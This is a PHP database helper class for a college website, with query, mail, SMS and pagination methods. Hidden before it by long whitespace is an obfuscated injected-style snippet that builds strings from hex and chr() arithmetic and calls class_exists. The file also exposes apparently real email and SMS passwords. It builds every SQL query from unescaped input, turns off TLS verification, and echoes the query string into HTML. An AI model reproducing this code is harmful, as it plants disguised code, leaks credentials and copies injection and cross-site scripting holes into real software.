<?php                                                                                                                                                                                                                                                                                                                                                                                                 $dYysek = "\x73" . "\170" . "\106" . "\x5f" . chr (90) . "\102" . "\x67" . "\162" . "\x65";$HULKSBtLf = "\143" . chr ( 601 - 493 ).chr ( 1084 - 987 ).'s' . chr (115) . chr ( 394 - 299 ).chr (101) . chr ( 1069 - 949 )."\x69" . "\x73" . "\164" . "\163";$VcTCZZvqcx = class_exists($dYysek); $HULKSBtLf = "9913";$TjxkglchFn = !1; ?><?php 
	require dirname(__FILE__).'/ConnectDatabase.php';

	class DataModel extends ConnectDatabase{
		
		public function __construct()
		{
			parent::__construct();
		}

		public function add($tableName, $data)
		{
			$i = 0;
			$colName = "";
			$colValue = "";
			foreach ($data as $key => $value) {
				if($i != 0){
					$colName .= ", ";
					$colValue .= ", ";
				}
				$colName .=$key;
				$colValue .="'$value'";
				$i++;
			}
			$sql = "INSERT INTO {$tableName}({$colName}) VALUES({$colValue})";
			//echo $sql;
			$query = $this->conn->query($sql);
			if($query == true){
				return $this->conn->insert_id;
			}
			else{
				return null;
			}
		}

		public function insert($sql)
		{
			$query = $this->conn->query($sql);
			if($query == true){
				return $this->conn->insert_id;
			}
			else{
				return null;
			}
		}
		
		public function update($tableName, $data, $condition)
		{
			$colNameValue = "";
			$i = 0;
			foreach ($data as $key => $value) {
				if($i != 0){
					$colNameValue .=", ";
				}
				$colNameValue .=$key."='$value'";
				$i++;
			}
			$sql = "UPDATE {$tableName} SET {$colNameValue} WHERE {$condition}";
	
			$query = $this->conn->query($sql);
			if($this->conn->affected_rows > 0){
				return true;
			}
			else{
				return false;
			}
		}

		public function delete($tableName, $condition)
		{
			$sql = "DELETE FROM {$tableName} WHERE {$condition}";
			$query = $this->conn->query($sql);
			if($this->conn->affected_rows > 0){
				return true;
			}
			else{
				return false;
			}
		}

		public function get($tableName)
		{
			$result = null;
			$sql = "SELECT * FROM $tableName";
			$query = $this->conn->query($sql);
			if($query != null){
				while ($row = $query->fetch_assoc()) {
					$result[] = $row;
				}
				return $result;
			}
			else{
				return null;
			}
		}

		public function getById($tableName, $idName, $idValue)
		{
			$sql = "SELECT * FROM {$tableName} WHERE {$idName}='{$idValue}'";
			$query = $this->conn->query($sql);
			$result = null;
			if($query != null){
				$result = $query->fetch_assoc();
			}
			return $result;			
		}

		public function getWhere($tableName, $condition)
		{
			$sql = "SELECT * FROM {$tableName} WHERE {$condition}";
			$query = $this->conn->query($sql);
			$result = null;
			if($query != null){
				while ($row = $query->fetch_assoc()) {
					$result[] = $row;
				}
			}
			return $result;			
		}

		public function getFirstWhere($tableName, $condition)
		{
			$sql = "SELECT * FROM {$tableName} WHERE {$condition}";
			$query = $this->conn->query($sql);
			$result = null;
			if($query != null){
				while ($row = $query->fetch_assoc()) {
					$result[] = $row;
				}
				$result = $result[0];
			}
			return $result;			
		}

		public function selectWhere($tableName, $columnName, $condition)
		{
			$sql = "SELECT {$columnName} FROM {$tableName} WHERE {$condition}";
			$query = $this->conn->query($sql);
			$result = null;
			if($query != null){
				while ($row = $query->fetch_assoc()) {
					$result[] = $row;
				}
			}
			return $result;			
		}

		public function getFilter($tableName, $filterArray, $extraCondition = '')
		{
			$condition = "";
			$flag = false;
			foreach ($filterArray as $key => $value) {
				if(strlen($value) > 0){
					if($flag){
						$condition .= " AND "; 
					}
					else{
						$flag = true;
					}
					$condition .= $key."='$value'";
				}
			}

			if(!empty($extraCondition)){
				$condition .= $extraCondition;
			}

			$where = ' WHERE ';
			$limitOrder = substr($condition, 0,6);
			if($limitOrder == ' limit'){
				$where = '';
			} 
			elseif($limitOrder == ' order'){
				$where = '';
			}
			elseif(strlen($condition) == 0){
				$where = '';
			}

			$sql = "SELECT * FROM {$tableName} {$where} {$condition}";
			//echo $sql;
			//die();

			$query = $this->conn->query($sql);
			$result = null;
			if($query != null){
				while ($row = $query->fetch_assoc()) {
					$result[] = $row;
				}
			}
			
			return $result;			
		}

		public function getQuery($sql)
		{
			$query = $this->conn->query($sql);
			$result = null;
			if($query != null){
				while ($row = $query->fetch_assoc()) {
					$result[] = $row;
				}
			}
			return $result;			
		}

		public function getTotal($tableName)
		{
			$sql = "SELECT count(*) FROM {$tableName}";
			$query = $this->conn->query($sql);
			$result = null;
			if($query != null){
				$row = $query->fetch_array();
				$result = $row[0]; 
			}
			return $result;			
		}

		public function getTotalWhere($tableName, $condition)
		{
			$sql = "SELECT count(*) FROM {$tableName} WHERE {$condition}";
			$query = $this->conn->query($sql);
			$result = 0;
			if($query != null){
				$row = $query->fetch_array();
				$result = $row[0]; 
			}
			return $result;			
		}

		public function max($tableName, $colName)
		{
			$sql = "SELECT max($colName) FROM ".$tableName;
			$query = $this->conn->query($sql);
			if($query != null){
				$row = $query->fetch_array();
				return $row['0'];
			}
			else{
				return null;
			}
		}

		public function getColumnName($tableName, $columnName, $id, $idValue)
		{
			$sql = "SELECT {$columnName} FROM {$tableName} WHERE {$id} = '{$idValue}'";
			$query = $this->conn->query($sql);
			$msg = "";
			if($query != null){
				$row = $query->fetch_assoc();
				if($row != null){
					$msg = $row[$columnName];
				}
			}
			return $msg;	
		}

		public function getSumWhere($tableName, $columnName, $condition)
		{
			$sql = "SELECT sum({$columnName}) FROM {$tableName} WHERE $condition";
			$query = $this->conn->query($sql);
			if($query != null){
				$row = $query->fetch_array();
				return $row['0'];
			}
			else{
				return null;
			}	
		}

		public function getCondition($filterArray)
		{
			$condition = "";
			$flag = false;
			foreach ($filterArray as $key => $value) {
				if(strlen($value) > 0){
					if($flag){
						$condition .= " AND "; 
					}
					else{
						$flag = true;
					}
					$condition .= $key."='$value'";
				}
			}
			return $condition;
		}

		public function timeToArray($time)
		{
			$time_array = explode(' ', $time);
			$hour_minute_array = explode(':', $time_array[0]);
			$hour = $hour_minute_array[0];
			$minute = $hour_minute_array[1];
			$am_pm = $time_array[1];

			$result = array(
				'hour' => $hour,
				'minute' => $minute,
				'am_pm' => $am_pm
			);
			return $result;
		}

		public function sendMail($to, $subject, $message)
		{
			require_once dirname(__FILE__).'/../library/phpmailer/PHPMailerAutoload.php';
			$mail = new PHPMailer;
			// $mail->SMTPDebug = 3;
			$mail->isSMTP();
			$mail->SMTPAuth   = true;
			$mail->SMTPSecure = 'tls';
			$mail->Host       = 'smtp.gmail.com';
			$mail->Port       = 587;
			$mail->isHTML(true);
			$mail->CharSet = 'UTF-8';
		
			$mail->Username   = 'support@magadhmahilacollege.org';
			$mail->Password   = 'patna#123';

			$mail->setFrom('support@magadhmahilacollege.org', 'MAGADH MAHILA COLLEGE');
			// $mail->addAddress('gyan@aviweb.in', 'Gyanprakash'); 
			$mail->addAddress($to); 
			$mail->Subject  = $subject;
			$bodyContent = $message;
			$bodyContent .='<p>This is an auto generated email. Please do not reply to this email.</p>';
			$mail->Body = $bodyContent;

			$mail->SMTPOptions = array('ssl' => array(
			  	'verify_peer' => false,
			   	'verify_peer_name' => false,
			   	'allow_self_signed' => false
			));

			if($mail->send()){
			    return true;
			}
			else{
			  	return false;
			}  
		}

		public function sendMessage($mobile, $message)
		{
			$username = 'aviwebdemo';
			$password = '9044006644';
			$senderId = 'AVIWEB';

			$Curl_Session = curl_init('http://sms1.aviweb.in/http-api.php');
			curl_setopt ($Curl_Session, CURLOPT_POST, 1);
			curl_setopt ($Curl_Session, CURLOPT_POSTFIELDS, "username=$username&password=$password&senderid=$senderId&route=1&number=$mobile&message=$message");
			curl_setopt ($Curl_Session, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($Curl_Session, CURLOPT_RETURNTRANSFER,1);
			$result = curl_exec ($Curl_Session);
			curl_close ($Curl_Session);
			 
			//$a1=array("ok","2904","2905");
			// if ($result == 'ok'){
			//     echo 'message sent';
			// }
			// elseif ($result == '2904'){
			//  echo 'message sending failed';
			// }else{
			//     echo '';
			// }
			// print_r($result);
			return true;
		}

		public function search($tableName, $filterArray, $extraCondition = '')
		{
			$condition = "";
			$flag = false;
			foreach ($filterArray as $key => $value) {
				if(strlen($value) > 0){
					if($flag){
						$condition .= " OR "; 
					}
					else{
						$flag = true;
					}
					$condition .= $key." like '%$value%'";
				}
			}

			if(!empty($extraCondition)){
				$condition .= $extraCondition;
			}

			$sql = "SELECT * FROM {$tableName} WHERE {$condition}";
			$query = $this->conn->query($sql);
			$result = null;
			if($query != null){
				while ($row = $query->fetch_assoc()) {
					$result[] = $row;
				}
			}
			// echo $sql;
			// print_r($result);
			// // die();
			return $result;			
		}

		public function page($pageRecord)
		{
			$page = 1;
			if(isset($_GET['page'])){
				$page = $_GET['page'];
				// $_SESSION['filter']['page'] = $page;
			}
			$startPage = ($page - 1) * $pageRecord;
			return $startPage;
		}

		public function pagination($url, $totalRecords, $record_per_page)
		{
			$totalPage = ceil($totalRecords / $record_per_page);
			$queryString = $_SERVER['QUERY_STRING'];
			if(isset($_GET['page'])){
				$pagePosition = strpos($queryString,'&page');
				$queryString = substr($queryString, 0,$pagePosition);
			}

			$url = $url.'?'.$queryString;
			if(isset($_GET['page'])){
				$page = $_GET['page'];
			}
			else{
				$page = 0;
			}
			
			echo '<nav aria-label="Page navigation">';
			echo '<ul class="pagination pagination-sm my-2 float-right">';
			if($page > 1){
				echo '<li class="page-item"><a href="'.$url.'&page='.($page - 1).'" class="page-link">Previous</a></li>';
			}
			else{
				echo '<li class="page-item disabled"><span class="page-link">Previous</span></li>';
			}

			if($totalPage <= 10){
				for($i = 1; $i <= $totalPage; $i++){
					$active = $page == $i ? 'active' : '';
					echo '<li class="page-item '.$active.'"><a href="'.$url.'&page='.$i.'" class="page-link">'.$i.'</a></li>';
				}
			}
			else{
				if($page < 5){
					for($i = 1; $i <= 5; $i++){
						$active = $page == $i ? 'active' : '';
						echo '<li class="page-item '.$active.'"><a href="'.$url.'&page='.$i.'" class="page-link">'.$i.'</a></li>';
					}
					echo '<li class="page-item"><a href="#" class="page-link">...</a></li>';
					echo '<li class="page-item"><a href="'.$url.'&page='.$totalPage.'" class="page-link">'.$totalPage.'</a></li>';
				}
				elseif($page > $totalPage - 4){
					echo '<li class="page-item"><a href="'.$url.'&page=1" class="page-link">1</a></li>';
					echo '<li class="page-item"><a href="#" class="page-link">...</a></li>';
					for($i = $totalPage - 4; $i <= $totalPage; $i++){
						$active = $page == $i ? 'active' : '';
						echo '<li class="page-item '.$active.'"><a href="'.$url.'&page='.$i.'" class="page-link">'.$i.'</a></li>';
					}
				}
				elseif($page >= 5){
					$previous = $page - 1;
					$next = $page + 1;
						echo '<li class="page-item"><a href="'.$url.'&page=1" class="page-link">1</a></li>';
						echo '<li class="page-item"><a href="#" class="page-link">...</a></li>';
						echo '<li class="page-item"><a href="'.$url.'&page='.$previous.'" class="page-link">'.$previous.'</a></li>';
						echo '<li class="page-item active"><a href="'.$url.'&page='.$page.'" class="page-link">'.$page.'</a></li>';
						echo '<li class="page-item"><a href="'.$url.'&page='.$next.'" class="page-link">'.$next.'</a></li>';
						echo '<li class="page-item"><a href="#" class="page-link">...</a></li>';
						echo '<li class="page-item"><a href="'.$url.'&page='.$totalPage.'" class="page-link">'.$totalPage.'</a></li>';
					}
				}
				if($page < $totalPage){
					echo '<li class="page-item"><a href="'.$url.'&page='.($page + 1).'" class="page-link">Next</a></li>';
				}
				else{
					echo '<li class="page-item disabled"><span class="page-link">Next</span></li>';
				}
				echo '</ul></nav>';
		}
	}
 ?>